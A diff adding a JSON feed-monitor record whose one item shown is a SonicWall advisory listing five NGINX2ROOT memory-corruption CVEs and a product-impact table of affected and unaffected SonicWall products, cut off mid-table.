@@ -1,0 +1,992 @@
+{
+  "schema_version": 1,
+  "source_id": "blog_watch",
+  "collect_date": "2026-11-28",
+  "collect_window": {
+    "start": "2026-10-24T18:16:19+00:00",
+    "end": "2026-11-27T10:37:10+00:00",
+    "hours": 808
+  },
+  "producer": {
+    "name": "sentinel-site",
+    "version": "0.1.0",
+    "run_id": "46101620537",
+    "commit": "dc4a09c"
+  },
+  "stats": {
+    "total": 12,
+    "by_kind": {
+      "publish": 12
+    },
+    "by_via": {
+      "rss": 12
+    },
+    "by_source": {
+      "sonicwall-advisory": 1,
+      "msrc": 1,
+      "yage-share": 2,
+      "cocomelonc": 1,
+      "innei": 7
+    },
+    "failed_lists": [
+      "unknowncheats-ac",
+      "cognisys-labs"
+    ],
+    "sources_ok": 53,
+    "sources_failed": [
+      {
+        "id": "unknowncheats-ac",
+        "error": "no_candidates"
+      },
+      {
+        "id": "cognisys-labs",
+        "error": "html_fetch:[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Hostname mismatch, certificate is not valid for 'labs.cognisys.group'. (_ssl.c:1081); browser:Page.goto: Download is starting\nCall log:\n  - navigating to \"https://labs.cognisys.group/\", waiting until \"domcontentloaded\"\n"
+      }
+    ],
+    "baselines": 0,
+    "via_sources": {
+      "llm": 10,
+      "browser_llm": 9,
+      "rss": 34
+    },
+    "llm_usage": {
+      "model": "deepseek-v4-flash",
+      "requests": 10,
+      "calls": 10,
+      "prompt_tokens": 10136,
+      "completion_tokens": 887,
+      "total_tokens": 11023,
+      "prompt_cache_hit_tokens": 7168,
+      "prompt_cache_miss_tokens": 2968
+    },
+    "by_content_status": {
+      "ok": 12
+    }
+  },
+  "items": [
+    {
+      "id": "a:cc384dd8516d0029",
+      "who": "sonicwall-advisory",
+      "who_url": "https://psirt.global.sonicwall.com/",
+      "action": "publish",
+      "target": "NGINX2ROOT Vulnerability SonicWall Product Impact",
+      "target_url": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2026-0022",
+      "text": "sonicwall-advisory published: NGINX2ROOT Vulnerability SonicWall Product Impact",
+      "at": "2026-11-27T10:37:10+00:00",
+      "external_id": "a:cc384dd8516d0029",
+      "url": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2026-0022",
+      "title": "NGINX2ROOT Vulnerability SonicWall Product Impact",
+      "content": "<p>NGINX2ROOT is the name researchers gave to five independent NGINX memory corruption vulnerabilities disclosed on 18 November 2026. Depending on the enabled feature, an unauthenticated remote attacker may crash an NGINX worker or execute code with that worker’s privileges. The researchers also demonstrated a separate Linux kernel SCTP flaw that can be chained after NGINX compromise to reach host root; an NGINX vulnerability alone does not imply root access.</p><table><thead><tr><th>CVE</th><th>Affected configuration</th><th>Vulnerability</th></tr></thead><tbody><tr><td><strong>CVE-2026-123007</strong></td><td>NGINX accepts client connections over HTTP/2.</td><td>An integer overflow in HTTP/2 flow control can cause a heap buffer overflow in the worker process. Researchers demonstrated unauthenticated remote code execution. (<a href=\"https://nginx2root.com/?utm_source=chatgpt.com\" title=\"NGINX2Root by Xint — From nginx visitor to root of the server host\">nginx2root.com</a>)</td></tr><tr><td><strong>CVE-2026-123633</strong></td><td>NGINX accepts HTTP/2 client connections and proxies requests to a backend.</td><td>When a worker approaches its configured connection limit, a crafted request can trigger a use-after-free in that worker. (<a href=\"https://blog.cloudflare.com/nginx2root/?utm_source=chatgpt.com\" title=\"nginx2root: five new nginx vulnerabilities, and how Cloudflare protects origins from the worst of them\">blog.cloudflare.com</a>)</td></tr><tr><td><strong>CVE-2026-121810</strong></td><td>NGINX accepts HTTP/3 (QUIC) client connections and proxies requests to a backend.</td><td>Under specific connection-handling conditions, a crafted request can trigger a use-after-free in the worker process. (<a href=\"https://blog.cloudflare.com/nginx2root/?utm_source=chatgpt.com\" title=\"nginx2root: five new nginx vulnerabilities, and how Cloudflare protects origins from the worst of them\">blog.cloudflare.com</a>)</td></tr><tr><td><strong>CVE-2026-123634</strong></td><td>NGINX uses a resolver and a variable in the proxied server name. A mirror or Server Side Includes (SSI) subrequest resolves the same name.</td><td>A crafted HTTP request can trigger a use-after-free during name resolution in the worker process.</td></tr><tr><td><strong>CVE-2026-113425</strong></td><td>NGINX operates as a mail proxy with <code>proxy on</code> and <code>auth_http</code> configured.</td><td>Crafted mail-proxy traffic can trigger a use-after-free in the worker process. (<a href=\"https://blog.cloudflare.com/nginx2root/?utm_source=chatgpt.com\" title=\"nginx2root: five new nginx vulnerabilities, and how Cloudflare protects origins from the worst of them\">blog.cloudflare.com</a>)</td></tr></tbody></table>\n<p>The table below outlines the impact of NGINX2ROOT&nbsp;vulnerability, on SonicWall products.\n</p><table class=\"MsoNormalTable\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" align=\"left\" width=\"654\" style=\"width: 490.25pt; border: none; margin-left: 6.75pt; margin-right: 6.75pt;\">\n<tbody>\n<tr style=\"mso-yfti-irow:0;mso-yfti-firstrow:yes;height:15.55pt\">\n<td width=\"240\" nowrap=\"\" style=\"width:179.75pt;border:solid windowtext 1.0pt;\nmso-border-alt:solid windowtext .5pt;background:#ED7D31;padding:0in 5.4pt 0in 5.4pt;\nheight:15.55pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;text-align:center;\nline-height:normal;mso-element:frame;mso-element-frame-hspace:9.0pt;\nmso-element-wrap:around;mso-element-anchor-horizontal:page;mso-element-left:\n42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\">\n<b>\n<span style=\"mso-ascii-font-family:Calibri;mso-fareast-font-family:&quot;Times New Roman&quot;;\nmso-hansi-font-family:Calibri;mso-bidi-font-family:Calibri;color:white\">SonicWall Product (Appliance/Cloud/Virtual/OnPrem) <o:p></o:p>\n</span>\n</b>\n</p>\n</td>\n<td width=\"96\" nowrap=\"\" style=\"width:1.0in;border:solid windowtext 1.0pt;\nborder-left:none;mso-border-left-alt:solid windowtext .5pt;mso-border-alt:\nsolid windowtext .5pt;background:#ED7D31;padding:0in 5.4pt 0in 5.4pt;\nheight:15.55pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;text-align:center;\nline-height:normal;mso-element:frame;mso-element-frame-hspace:9.0pt;\nmso-element-wrap:around;mso-element-anchor-horizontal:page;mso-element-left:\n42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\">\n<b>\n<span style=\"mso-ascii-font-family:Calibri;mso-fareast-font-family:&quot;Times New Roman&quot;;\nmso-hansi-font-family:Calibri;mso-bidi-font-family:Calibri;color:white\">Status <o:p></o:p>\n</span>\n</b>\n</p>\n</td>\n<td width=\"318\" nowrap=\"\" style=\"width:238.5pt;border:solid windowtext 1.0pt;\nborder-left:none;mso-border-left-alt:solid windowtext .5pt;mso-border-alt:\nsolid windowtext .5pt;background:#ED7D31;padding:0in 5.4pt 0in 5.4pt;\nheight:15.55pt\">\n<p class=\"MsoNormal\" style=\"margin-bottom:0in;line-height:normal;mso-element:\nframe;mso-element-frame-hspace:9.0pt;mso-element-wrap:around;mso-element-anchor-horizontal:\npage;mso-element-left:42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\">\n<b>\n<span style=\"mso-ascii-font-family:Calibri;mso-fareast-font-family:&quot;Times New Roman&quot;;\nmso-hansi-font-family:Calibri;mso-bidi-font-family:Calibri;color:white\">Description <o:p></o:p>\n</span>\n</b>\n</p>\n</td>\n</tr>\n<tr style=\"mso-yfti-irow:3;height:14.9pt\">\n<td width=\"240\" nowrap=\"\" style=\"width:179.75pt;border:solid windowtext 1.0pt;\nborder-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\npadding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 9pt;\">\n<b>Gen7 Firewalls</b>\n</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">- TZ270/W</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">- TZ370/W</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">- TZ470/W</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">- TZ570/W</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">- TZ670</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">- NSA 2700/3700/4700/5700/6700</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">- NSSP 10700/11700/13700/15700</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">- NSV 270/470/870 (ESX, KVM, HYPER-V, AWS, Azure)</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 9pt;\">\n<o:p></o:p>\n</span>\n</p>\n</td>\n<td width=\"96\" nowrap=\"\" style=\"width:1.0in;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;text-align:center;\nline-height:normal;mso-element:frame;mso-element-frame-hspace:9.0pt;\nmso-element-wrap:around;mso-element-anchor-horizontal:page;mso-element-left:\n42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px; text-align: left; white-space: normal;\">Not Affected</span>\n</p>\n</td>\n<td width=\"318\" nowrap=\"\" style=\"width:238.5pt;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\"><p class=\"MsoNormal\" style=\"margin-bottom:0in;line-height:normal;mso-element:\nframe;mso-element-frame-hspace:9.0pt;mso-element-wrap:around;mso-element-anchor-horizontal:\npage;mso-element-left:42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px; white-space: normal;\">Not vulnerable.</span></p>\n</td>\n</tr>\n<tr style=\"mso-yfti-irow:3;height:14.9pt\">\n<td width=\"240\" nowrap=\"\" style=\"width:179.75pt;border:solid windowtext 1.0pt;\nborder-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\npadding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 9pt;\">\n<b>Gen8 Firewalls</b>\n</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">- TZ80, TZ280, TZ280W, TZ380, TZ380W, TZ480, TZ580, TZ680.</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">- NSa2800, NSa3800, NSa4800, NSa5800</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">- NSv XS, NSv S, NSv M, NSv L (ESX, KVM, HYPER-V, AWS, Azure).</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 9pt;\">\n<o:p></o:p>\n</span>\n</p>\n</td>\n<td width=\"96\" nowrap=\"\" style=\"width:1.0in;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;text-align:center;\nline-height:normal;mso-element:frame;mso-element-frame-hspace:9.0pt;\nmso-element-wrap:around;mso-element-anchor-horizontal:page;mso-element-left:\n42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px; white-space: normal; text-align: left;\">Not Affected</span></p>\n</td>\n<td width=\"318\" nowrap=\"\" style=\"width:238.5pt;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" style=\"margin-bottom:0in;line-height:normal;mso-element:\nframe;mso-element-frame-hspace:9.0pt;mso-element-wrap:around;mso-element-anchor-horizontal:\npage;mso-element-left:42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px; white-space: normal;\">Not vulnerable.</span></p>\n</td>\n</tr><tr><td width=\"240\" nowrap=\"\" style=\"width:179.75pt;border:solid windowtext 1.0pt;\nborder-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\npadding:0in 5.4pt 0in 5.4pt;height:14.9pt\"><span style=\"font-weight: bolder; font-size: 12px; text-align: justify; white-space: normal;\">MySonicwall (MSW)</span></td><td width=\"96\" nowrap=\"\" style=\"width:1.0in;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px; white-space: normal;\">Affected</span></td><td width=\"318\" nowrap=\"\" style=\"width:238.5pt;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px; white-space: normal;\">Fixed, upgraded to latest nginx fix version.</span></td></tr>\n<tr style=\"mso-yfti-irow:9;height:14.9pt\">\n<td width=\"240\" style=\"width:179.75pt;border:solid windowtext 1.0pt;border-top:\nnone;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\npadding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">\n<b>Analytics</b>\n</span>\n<br>\n</p>\n</td>\n<td width=\"96\" style=\"width:1.0in;border-top:none;border-left:none;border-bottom:\nsolid windowtext 1.0pt;border-right:solid windowtext 1.0pt;mso-border-top-alt:\nsolid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;mso-border-alt:\nsolid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: left; margin-bottom: 0in; line-height: normal;\">&nbsp;<span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px;\">TBD</span><br>\n</p>\n</td>\n<td width=\"318\" style=\"width:238.5pt;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" style=\"margin-bottom:0in;line-height:normal;mso-element:\nframe;mso-element-frame-hspace:9.0pt;mso-element-wrap:around;mso-element-anchor-horizontal:\npage;mso-element-left:42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px;\">Under investigation.</span></p>\n</td>\n</tr>\n<tr style=\"mso-yfti-irow:11;height:14.9pt\">\n<td width=\"240\" style=\"width:179.75pt;border:solid windowtext 1.0pt;border-top:\nnone;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\npadding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">\n<b>NSM</b></span><span style=\"font-size: 12px;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span></p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">- NSM On-Premise</span>\n</p>\n</td>\n<td width=\"96\" style=\"width:1.0in;border-top:none;border-left:none;border-bottom:\nsolid windowtext 1.0pt;border-right:solid windowtext 1.0pt;mso-border-top-alt:\nsolid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;mso-border-alt:\nsolid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: left; margin-bottom: 0in; line-height: normal;\"><font face=\"Segoe UI\"><span style=\"font-size: 14px;\">TBD</span></font></p>\n</td>\n<td width=\"318\" style=\"width:238.5pt;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" style=\"margin-bottom:0in;line-height:normal;mso-element:\nframe;mso-element-frame-hspace:9.0pt;mso-element-wrap:around;mso-element-anchor-horizontal:\npage;mso-element-left:42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px;\">Under investigation.</span></p>\n</td>\n</tr>\n<tr><td width=\"240\" nowrap=\"\" style=\"width:179.75pt;border:solid windowtext 1.0pt;\nborder-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\npadding:0in 5.4pt 0in 5.4pt;height:14.9pt\"><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom: 0in; white-space: normal; text-align: justify; line-height: normal;\"><span style=\"font-size: 12px;\"><span style=\"font-weight: bolder;\">NSM</span></span><span style=\"font-size: 12px;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span></p><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom: 0in; white-space: normal; text-align: justify; line-height: normal;\"><span style=\"font-size: 12px;\">- NSM SaaS</span></p></td><td width=\"96\" nowrap=\"\" style=\"width:1.0in;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px; white-space: normal;\">Affected</span></td><td width=\"318\" nowrap=\"\" style=\"width:238.5pt;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px; white-space: normal;\">Fixed, upgraded to latest nginx fix version.</span></td></tr><tr style=\"mso-yfti-irow:6;height:14.9pt\">\n<td width=\"240\" nowrap=\"\" style=\"width:179.75pt;border:solid windowtext 1.0pt;\nborder-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\npadding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 9pt;\">\n<b>SMA 1000</b>\n</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">- SMA 6200/7200/6210/7210</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">- SMA 8200v (ESX, KVM, Hyper-V, AWS, Azure)</span></p><p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\"><span style=\"font-size: 12px;\">- SRA EX 7000</span></p>\n</td>\n<td width=\"96\" nowrap=\"\" style=\"width:1.0in;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: left; margin-bottom: 0in; line-height: normal;\"><font face=\"Segoe UI\"><span style=\"font-size: 14px; text-wrap-mode: wrap;\">Not affected</span></font></p>\n</td>\n<td width=\"318\" nowrap=\"\" style=\"width:238.5pt;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" style=\"margin-bottom:0in;line-height:normal;mso-element:\nframe;mso-element-frame-hspace:9.0pt;mso-element-wrap:around;mso-element-anchor-horizontal:\npage;mso-element-left:42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px; white-space: normal;\">Not vulnerable&nbsp;</span></p>\n</td>\n</tr>\n<tr style=\"mso-yfti-irow:7;height:14.9pt\">\n<td width=\"240\" style=\"width:179.75pt;border:solid windowtext 1.0pt;border-top:\nnone;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\npadding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 9pt;\">\n<b>Email Security</b></span></p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 9pt;\">- On-Premise Email Security</span></p><p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\"><span style=\"font-size: 12px;\">- Hosted Email Security (HES)</span></p>\n<p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;text-align:center;\nline-height:normal;mso-element:frame;mso-element-frame-hspace:9.0pt;\nmso-element-wrap:around;mso-element-anchor-horizontal:page;mso-element-left:\n42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\">\n<span style=\"font-size: 9pt;\">\n<o:p></o:p>\n</span>\n</p>\n</td>\n<td width=\"96\" style=\"width:1.0in;border-top:none;border-left:none;border-bottom:\nsolid windowtext 1.0pt;border-right:solid windowtext 1.0pt;mso-border-top-alt:\nsolid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;mso-border-alt:\nsolid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;text-align:center;\nline-height:normal;mso-element:frame;mso-element-frame-hspace:9.0pt;\nmso-element-wrap:around;mso-element-anchor-horizontal:page;mso-element-left:\n42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px; text-align: left;\">Not affected</span></p></td><td width=\"318\" style=\"width:238.5pt;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px;\">Not vulnerable.</span></td>\n</tr>\n<tr style=\"mso-yfti-irow:7;height:14.9pt\">\n<td width=\"240\" style=\"width:179.75pt;border:solid windowtext 1.0pt;border-top:\nnone;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\npadding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\"><span style=\"font-size: 12px;\"><b>Theron</b></span></p>\n<p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;text-align:center;\nline-height:normal;mso-element:frame;mso-element-frame-hspace:9.0pt;\nmso-element-wrap:around;mso-element-anchor-horizontal:page;mso-element-left:\n42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\">\n<span style=\"font-size: 9pt;\">\n<o:p></o:p>\n</span>\n</p>\n</td>\n<td width=\"96\" style=\"width:1.0in;border-top:none;border-left:none;border-bottom:\nsolid windowtext 1.0pt;border-right:solid windowtext 1.0pt;mso-border-top-alt:\nsolid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;mso-border-alt:\nsolid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;text-align:center;\nline-height:normal;mso-element:frame;mso-element-frame-hspace:9.0pt;\nmso-element-wrap:around;mso-element-anchor-horizontal:page;mso-element-left:\n42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px; text-align: left;\">Not affected</span></p></td><td width=\"318\" style=\"width:238.5pt;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px;\">Not vulnerable.</span></td>\n</tr>\n<tr style=\"mso-yfti-irow:7;height:14.9pt\">\n<td width=\"240\" style=\"width:179.75pt;border:solid windowtext 1.0pt;border-top:\nnone;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\npadding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\"><span style=\"font-size: 9pt;\"><b>Cloud Secure Edge (CSE)</b></span></p>\n<p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;text-align:center;\nline-height:normal;mso-element:frame;mso-element-frame-hspace:9.0pt;\nmso-element-wrap:around;mso-element-anchor-horizontal:page;mso-element-left:\n42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\">\n<span style=\"font-size: 9pt;\">\n<o:p></o:p>\n</span>\n</p>\n</td>\n<td width=\"96\" style=\"width:1.0in;border-top:none;border-left:none;border-bottom:\nsolid windowtext 1.0pt;border-right:solid windowtext 1.0pt;mso-border-top-alt:\nsolid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;mso-border-alt:\nsolid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: left; margin-bottom: 0in; line-height: normal;\"><font face=\"Segoe UI\"><span style=\"font-size: 14px;\">TBD</span></font></p></td><td width=\"318\" style=\"width:238.5pt;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px;\">Under investigation.</span></td>\n</tr>\n<tr style=\"mso-yfti-irow:7;height:14.9pt\">\n<td width=\"240\" style=\"width:179.75pt;border:solid windowtext 1.0pt;border-top:\nnone;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\npadding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; 